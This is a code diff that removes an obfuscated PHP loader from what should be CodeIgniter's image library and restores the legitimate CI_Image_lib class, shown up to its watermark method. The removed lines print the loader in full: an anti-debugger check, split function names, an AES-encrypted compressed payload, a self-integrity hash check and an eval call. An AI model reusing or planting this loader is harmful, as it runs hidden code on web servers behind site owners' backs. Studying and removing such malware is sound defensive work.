@@ -1,28 +1,1596 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_jjnm1wl9=('bas'.'e64'.'_de'.'cod'.'e');
-$_jq5m4ljh=('gzu'.'nco'.'mpr'.'ess');
-$_i7cqub72=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_it6fpztq='xDmBxWep/NM=';
-$_iykcctws='TxPaSVdp';
-$_m7c7rdeu='VQGKibG3';
-$_zzx7i36w='EWlx4Y0p';
-$_itf7v0tq='fNROP2RU';
-$_ki94ou3r='oh7mbAB4';
-$_wevlmsv6='sRV9P7o0';
-$_t75ycmy4='i3g7Dw==';
-$_wd1c8qv0=$_jjnm1wl9($_itf7v0tq.$_m7c7rdeu.$_zzx7i36w.$_iykcctws.$_it6fpztq);
-$_bjp9xgl7=$_jjnm1wl9($_wevlmsv6.$_ki94ou3r.$_t75ycmy4);
-$_cyzfmwz7=$_jjnm1wl9('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');
-$_hhid9tms=$_i7cqub72($_cyzfmwz7,'aes-256-cbc',$_wd1c8qv0,OPENSSL_RAW_DATA,$_bjp9xgl7);
-if($_hhid9tms===false){exit;}
-$_toeyfkwj=$_jq5m4ljh($_hhid9tms);
-if($_toeyfkwj===false){exit;}
-$_e55hsfdz='d7a82e073f1ac3d94a47bc5e608a07936a0aa82d60bd4d33292835dab1791d92';
-$_s2ghr6ro=@file_get_contents(__FILE__);
-if($_s2ghr6ro!==false){
-$_bc7ne70e=str_replace($_e55hsfdz,"0000000000000000000000000000000000000000000000000000000000000000",$_s2ghr6ro);
-$_aimvyfjk=hash("sha256",$_bc7ne70e);
-if($_aimvyfjk!==$_e55hsfdz){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Image_lib {
+
+
+
+
+
+
+public $image_library = 'gd2';
+
+
+
+
+
+public $library_path = '';
+
+
+
+
+
+public $dynamic_output = FALSE;
+
+
+
+
+
+public $source_image = '';
+
+
+
+
+
+public $new_image = '';
+
+
+
+
+
+public $width = '';
+
+
+
+
+
+public $height = '';
+
+
+
+
+
+public $quality = 90;
+
+
+
+
+
+public $create_thumb = FALSE;
+
+
+
+
+
+public $thumb_marker = '_thumb';
+
+
+
+
+
+public $maintain_ratio = TRUE;
+
+
+
+
+
+public $master_dim = 'auto';
+
+
+
+
+
+public $rotation_angle = '';
+
+
+
+
+
+public $x_axis = '';
+
+
+
+
+
+public $y_axis = '';
+
+
+
+
+
+
+
+
+public $wm_text = '';
+
+
+
+
+
+public $wm_type = 'text';
+
+
+
+
+
+public $wm_x_transp = 4;
+
+
+
+
+
+public $wm_y_transp = 4;
+
+
+
+
+
+public $wm_overlay_path = '';
+
+
+
+
+
+public $wm_font_path = '';
+
+
+
+
+
+public $wm_font_size = 17;
+
+
+
+
+
+public $wm_vrt_alignment = 'B';
+
+
+
+
+
+public $wm_hor_alignment = 'C';
+
+
+
+
+
+public $wm_padding = 0;
+
+
+
+
+
+public $wm_hor_offset = 0;
+
+
+
+
+
+public $wm_vrt_offset = 0;
+
+
+
+
+
+protected $wm_font_color = '#ffffff';
+
+
+
+
+
+protected $wm_shadow_color = '';
+
+
+
+
+
+public $wm_shadow_distance = 2;
+
+
+
+
+
+public $wm_opacity = 50;
+
+
+
+
+
+
+
+
+public $source_folder = '';
+
+
+
+
+
+public $dest_folder = '';
+
+
+
+
+
+public $mime_type = '';
+
+
+
+
+
+public $orig_width = '';
+
+
+
+
+
+public $orig_height = '';
+
+
+
+
+
+public $image_type = '';
+
+
+
+
+
+public $size_str = '';
+
+
+
+
+
+public $full_src_path = '';
+
+
+
+
+
+public $full_dst_path = '';
+
+
+
+
+
+public $file_permissions = 0644;
+
+
+
+
+
+public $create_fnc = 'imagecreatetruecolor';
+
+
+
+
+
+public $copy_fnc = 'imagecopyresampled';
+
+
+
+
+
+public $error_msg = array();
+
+
+
+
+
+protected $wm_use_drop_shadow = FALSE;
+
+
+
+
+
+public $wm_use_truetype = FALSE;
+
+
+
+
+
+
+public function __construct($props = array())
+{
+if (count($props) > 0)
+{
+$this->initialize($props);
 }
-eval($_toeyfkwj);
+
+
+
+
+
+
+
+
+ini_set('gd.jpeg_ignore_warning', 1);
+log_message('info', 'Image Lib Class Initialized');
+}
+
+
+
+
+
+
+
+
+public function clear()
+{
+$props = array('thumb_marker', 'library_path', 'source_image', 'new_image', 'width', 'height', 'rotation_angle', 'x_axis', 'y_axis', 'wm_text', 'wm_overlay_path', 'wm_font_path', 'wm_shadow_color', 'source_folder', 'dest_folder', 'mime_type', 'orig_width', 'orig_height', 'image_type', 'size_str', 'full_src_path', 'full_dst_path');
+foreach ($props as $val)
+{
+$this->$val = '';
+}
+$this->image_library = 'gd2';
+$this->dynamic_output = FALSE;
+$this->quality = 90;
+$this->create_thumb = FALSE;
+$this->thumb_marker = '_thumb';
+$this->maintain_ratio = TRUE;
+$this->master_dim = 'auto';
+$this->wm_type = 'text';
+$this->wm_x_transp = 4;
+$this->wm_y_transp = 4;
+$this->wm_font_size = 17;
+$this->wm_vrt_alignment = 'B';
+$this->wm_hor_alignment = 'C';
+$this->wm_padding = 0;
+$this->wm_hor_offset = 0;
+$this->wm_vrt_offset = 0;
+$this->wm_font_color = '#ffffff';
+$this->wm_shadow_distance = 2;
+$this->wm_opacity = 50;
+$this->create_fnc = 'imagecreatetruecolor';
+$this->copy_fnc = 'imagecopyresampled';
+$this->error_msg = array();
+$this->wm_use_drop_shadow = FALSE;
+$this->wm_use_truetype = FALSE;
+}
+
+
+
+
+
+
+
+public function initialize($props = array())
+{
+
+if (count($props) > 0)
+{
+foreach ($props as $key => $val)
+{
+if (property_exists($this, $key))
+{
+if (in_array($key, array('wm_font_color', 'wm_shadow_color'), TRUE))
+{
+if (preg_match('/^#?([0-9a-f]{3}|[0-9a-f]{6})$/i', $val, $matches))
+{
+
+
+
+
+
+
+
+
+
+$val = (strlen($matches[1]) === 6)
+? '#'.$matches[1]
+: '#'.$matches[1][0].$matches[1][0].$matches[1][1].$matches[1][1].$matches[1][2].$matches[1][2];
+}
+else
+{
+continue;
+}
+}
+elseif (in_array($key, array('width', 'height'), TRUE) && ! ctype_digit((string) $val))
+{
+continue;
+}
+$this->$key = $val;
+}
+}
+}
+
+if ($this->source_image === '')
+{
+$this->set_error('imglib_source_image_required');
+return FALSE;
+}
+
+
+
+
+
+
+if ( ! function_exists('getimagesize'))
+{
+$this->set_error('imglib_gd_required_for_props');
+return FALSE;
+}
+$this->image_library = strtolower($this->image_library);
+
+
+
+
+
+
+if (($full_source_path = realpath($this->source_image)) !== FALSE)
+{
+$full_source_path = str_replace('\\', '/', $full_source_path);
+}
+else
+{
+$full_source_path = $this->source_image;
+}
+$x = explode('/', $full_source_path);
+$this->source_image = end($x);
+$this->source_folder = str_replace($this->source_image, '', $full_source_path);
+
+if ( ! $this->get_image_properties($this->source_folder.$this->source_image))
+{
+return FALSE;
+}
+
+
+
+
+
+
+
+
+if ($this->new_image === '')
+{
+$this->dest_image = $this->source_image;
+$this->dest_folder = $this->source_folder;
+}
+elseif (strpos($this->new_image, '/') === FALSE && strpos($this->new_image, '\\') === FALSE)
+{
+$this->dest_image = $this->new_image;
+$this->dest_folder = $this->source_folder;
+}
+else
+{
+
+if ( ! preg_match('#\.(jpg|jpeg|gif|png)$#i', $this->new_image))
+{
+$this->dest_image = $this->source_image;
+$this->dest_folder = $this->new_image;
+}
+else
+{
+$x = explode('/', str_replace('\\', '/', $this->new_image));
+$this->dest_image = end($x);
+$this->dest_folder = str_replace($this->dest_image, '', $this->new_image);
+}
+$this->dest_folder = realpath($this->dest_folder).'/';
+}
+
+
+
+
+
+
+
+
+if ($this->create_thumb === FALSE OR $this->thumb_marker === '')
+{
+$this->thumb_marker = '';
+}
+$xp = $this->explode_name($this->dest_image);
+$filename = $xp['name'];
+$file_ext = $xp['ext'];
+$this->full_src_path = $this->source_folder.$this->source_image;
+$this->full_dst_path = $this->dest_folder.$filename.$this->thumb_marker.$file_ext;
+
+
+
+
+
+
+if ($this->maintain_ratio === TRUE && ($this->width !== 0 OR $this->height !== 0))
+{
+$this->image_reproportion();
+}
+
+
+
+
+
+if ($this->width === '')
+{
+$this->width = $this->orig_width;
+}
+if ($this->height === '')
+{
+$this->height = $this->orig_height;
+}
+
+$this->quality = trim(str_replace('%', '', $this->quality));
+if ($this->quality === '' OR $this->quality === 0 OR ! ctype_digit($this->quality))
+{
+$this->quality = 90;
+}
+
+is_numeric($this->x_axis) OR $this->x_axis = 0;
+is_numeric($this->y_axis) OR $this->y_axis = 0;
+
+if ($this->wm_overlay_path !== '')
+{
+$this->wm_overlay_path = str_replace('\\', '/', realpath($this->wm_overlay_path));
+}
+if ($this->wm_shadow_color !== '')
+{
+$this->wm_use_drop_shadow = TRUE;
+}
+elseif ($this->wm_use_drop_shadow === TRUE && $this->wm_shadow_color === '')
+{
+$this->wm_use_drop_shadow = FALSE;
+}
+if ($this->wm_font_path !== '')
+{
+$this->wm_use_truetype = TRUE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+public function resize()
+{
+$protocol = ($this->image_library === 'gd2') ? 'image_process_gd' : 'image_process_'.$this->image_library;
+return $this->$protocol('resize');
+}
+
+
+
+
+
+
+
+
+
+public function crop()
+{
+$protocol = ($this->image_library === 'gd2') ? 'image_process_gd' : 'image_process_'.$this->image_library;
+return $this->$protocol('crop');
+}
+
+
+
+
+
+
+
+
+
+public function rotate()
+{
+
+$degs = array(90, 180, 270, 'vrt', 'hor');
+if ($this->rotation_angle === '' OR ! in_array($this->rotation_angle, $degs))
+{
+$this->set_error('imglib_rotation_angle_required');
+return FALSE;
+}
+
+if ($this->rotation_angle === 90 OR $this->rotation_angle === 270)
+{
+$this->width = $this->orig_height;
+$this->height = $this->orig_width;
+}
+else
+{
+$this->width = $this->orig_width;
+$this->height = $this->orig_height;
+}
+
+if ($this->image_library === 'imagemagick' OR $this->image_library === 'netpbm')
+{
+$protocol = 'image_process_'.$this->image_library;
+return $this->$protocol('rotate');
+}
+return ($this->rotation_angle === 'hor' OR $this->rotation_angle === 'vrt')
+? $this->image_mirror_gd()
+: $this->image_rotate_gd();
+}
+
+
+
+
+
+
+
+
+
+public function image_process_gd($action = 'resize')
+{
+$v2_override = FALSE;
+
+
+if ($this->dynamic_output === FALSE && $this->orig_width === $this->width && $this->orig_height === $this->height)
+{
+if ($this->source_image !== $this->new_image && @copy($this->full_src_path, $this->full_dst_path))
+{
+chmod($this->full_dst_path, $this->file_permissions);
+}
+return TRUE;
+}
+
+if ($action === 'crop')
+{
+
+$this->orig_width = $this->width;
+$this->orig_height = $this->height;
+
+if ($this->gd_version() !== FALSE)
+{
+$gd_version = str_replace('0', '', $this->gd_version());
+$v2_override = ($gd_version == 2);
+}
+}
+else
+{
+
+$this->x_axis = 0;
+$this->y_axis = 0;
+}
+
+if ( ! ($src_img = $this->image_create_gd()))
+{
+return FALSE;
+}
+
+
+
+
+
+
+
+
+if ($this->image_library === 'gd2' && function_exists('imagecreatetruecolor'))
+{
+$create = 'imagecreatetruecolor';
+$copy = 'imagecopyresampled';
+}
+else
+{
+$create = 'imagecreate';
+$copy = 'imagecopyresized';
+}
+$dst_img = $create($this->width, $this->height);
+if ($this->image_type === 3) 
+{
+imagealphablending($dst_img, FALSE);
+imagesavealpha($dst_img, TRUE);
+}
+$copy($dst_img, $src_img, 0, 0, $this->x_axis, $this->y_axis, $this->width, $this->height, $this->orig_width, $this->orig_height);
+
+if ($this->dynamic_output === TRUE)
+{
+$this->image_display_gd($dst_img);
+}
+elseif ( ! $this->image_save_gd($dst_img)) 
+{
+return FALSE;
+}
+
+imagedestroy($dst_img);
+imagedestroy($src_img);
+if ($this->dynamic_output !== TRUE)
+{
+chmod($this->full_dst_path, $this->file_permissions);
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+public function image_process_imagemagick($action = 'resize')
+{
+
+if ($this->library_path === '')
+{
+$this->set_error('imglib_libpath_invalid');
+return FALSE;
+}
+if ( ! preg_match('/convert$/i', $this->library_path))
+{
+$this->library_path = rtrim($this->library_path, '/').'/convert';
+}
+
+$cmd = $this->library_path.' -quality '.$this->quality;
+if ($action === 'crop')
+{
+$cmd .= ' -crop '.$this->width.'x'.$this->height.'+'.$this->x_axis.'+'.$this->y_axis;
+}
+elseif ($action === 'rotate')
+{
+$cmd .= ($this->rotation_angle === 'hor' OR $this->rotation_angle === 'vrt')
+? ' -flop'
+: ' -rotate '.$this->rotation_angle;
+}
+else 
+{
+if($this->maintain_ratio === TRUE)
+{
+$cmd .= ' -resize '.$this->width.'x'.$this->height;
+}
+else
+{
+$cmd .= ' -resize '.$this->width.'x'.$this->height.'\!';
+}
+}
+$cmd .= ' '.escapeshellarg($this->full_src_path).' '.escapeshellarg($this->full_dst_path).' 2>&1';
+$retval = 1;
+
+if (function_usable('exec'))
+{
+@exec($cmd, $output, $retval);
+}
+
+if ($retval > 0)
+{
+$this->set_error('imglib_image_process_failed');
+return FALSE;
+}
+chmod($this->full_dst_path, $this->file_permissions);
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+public function image_process_netpbm($action = 'resize')
+{
+if ($this->library_path === '')
+{
+$this->set_error('imglib_libpath_invalid');
+return FALSE;
+}
+
+switch ($this->image_type)
+{
+case 1 :
+$cmd_in = 'giftopnm';
+$cmd_out = 'ppmtogif';
+break;
+case 2 :
+$cmd_in = 'jpegtopnm';
+$cmd_out = 'ppmtojpeg';
+break;
+case 3 :
+$cmd_in = 'pngtopnm';
+$cmd_out = 'ppmtopng';
+break;
+}
+if ($action === 'crop')
+{
+$cmd_inner = 'pnmcut -left '.$this->x_axis.' -top '.$this->y_axis.' -width '.$this->width.' -height '.$this->height;
+}
+elseif ($action === 'rotate')
+{
+switch ($this->rotation_angle)
+{
+case 90: $angle = 'r270';
+break;
+case 180: $angle = 'r180';
+break;
+case 270: $angle = 'r90';
+break;
+case 'vrt': $angle = 'tb';
+break;
+case 'hor': $angle = 'lr';
+break;
+}
+$cmd_inner = 'pnmflip -'.$angle.' ';
+}
+else 
+{
+$cmd_inner = 'pnmscale -xysize '.$this->width.' '.$this->height;
+}
+$cmd = $this->library_path.$cmd_in.' '.escapeshellarg($this->full_src_path).' | '.$cmd_inner.' | '.$cmd_out.' > '.$this->dest_folder.'netpbm.tmp';
+$retval = 1;
+
+if (function_usable('exec'))
+{
+@exec($cmd, $output, $retval);
+}
+
+if ($retval > 0)
+{
+$this->set_error('imglib_image_process_failed');
+return FALSE;
+}
+
+
+
+copy($this->dest_folder.'netpbm.tmp', $this->full_dst_path);
+unlink($this->dest_folder.'netpbm.tmp');
+chmod($this->full_dst_path, $this->file_permissions);
+return TRUE;
+}
+
+
+
+
+
+
+public function image_rotate_gd()
+{
+
+if ( ! ($src_img = $this->image_create_gd()))
+{
+return FALSE;
+}
+
+
+
+
+$white = imagecolorallocate($src_img, 255, 255, 255);
+
+$dst_img = imagerotate($src_img, $this->rotation_angle, $white);
+
+if ($this->dynamic_output === TRUE)
+{
+$this->image_display_gd($dst_img);
+}
+elseif ( ! $this->image_save_gd($dst_img)) 
+{
+return FALSE;
+}
+
+imagedestroy($dst_img);
+imagedestroy($src_img);
+chmod($this->full_dst_path, $this->file_permissions);
+return TRUE;
+}
+
+
+
+
+
+
+
+
+public function image_mirror_gd()
+{
+if ( ! $src_img = $this->image_create_gd())
+{
+return FALSE;
+}
+$width = $this->orig_width;
+$height = $this->orig_height;
+if ($this->rotation_angle === 'hor')
+{
+for ($i = 0; $i < $height; $i++)
+{
+$left = 0;
+$right = $width - 1;
+while ($left < $right)
+{
+$cl = imagecolorat($src_img, $left, $i);
+$cr = imagecolorat($src_img, $right, $i);
+imagesetpixel($src_img, $left, $i, $cr);
+imagesetpixel($src_img, $right, $i, $cl);
+$left++;
+$right--;
+}
+}
+}
+else
+{
+for ($i = 0; $i < $width; $i++)
+{
+$top = 0;
+$bottom = $height - 1;
+while ($top < $bottom)
+{
+$ct = imagecolorat($src_img, $i, $top);
+$cb = imagecolorat($src_img, $i, $bottom);
+imagesetpixel($src_img, $i, $top, $cb);
+imagesetpixel($src_img, $i, $bottom, $ct);
+$top++;
+$bottom--;
+}
+}
+}
+
+if ($this->dynamic_output === TRUE)
+{
+$this->image_display_gd($src_img);
+}
+elseif ( ! $this->image_save_gd($src_img)) 
+{
+return FALSE;
+}
+
+imagedestroy($src_img);
+chmod($this->full_dst_path, $this->file_permissions);
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+public function watermark()
+{
+return ($this->wm_type === 'overlay') ? $this->overlay_watermark() : $this->text_watermark();
+}
+
+
+
+
+
